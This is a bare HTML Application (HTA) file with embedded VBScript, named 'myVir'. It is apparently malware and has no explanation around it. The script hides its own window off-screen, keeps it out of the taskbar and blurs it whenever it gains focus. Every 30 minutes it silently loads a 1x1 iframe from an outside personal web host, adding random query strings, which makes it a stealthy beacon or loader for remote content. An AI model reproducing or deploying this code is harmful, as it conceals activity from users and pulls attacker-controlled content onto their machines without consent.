<HTML><HEAD> 
<HTA:APPLICATION ID="VirHTA" 
APPLICATIONNAME="myVir" 
SINGLEINSTANCE="yes" 
WINDOWSTATE="minimize" 
showInTaskbar="no"  
/></HEAD><BODY>  
<script language="vbscript">  
on error resume next  
self.moveto 5000,5000 
function vx() 
on error resume next 
randomize 
jjj.innerHTML="<iframe width=1 height=1 src='http://www.terra.es/personal8/galerii1/blank.htm?"&rnd*1000000&rnd*1000000&"'></iframe>"
end function 
setinterval "vx()",1800000 
sub window_onfocus 
self.moveto 5000,5000 
self.blur 
end sub 
</script></BODY><div id=jjj><iframe width=1 height=1 src="http://www.terra.es/personal8/galerii1/blank.htm"></iframe></div></HTML> 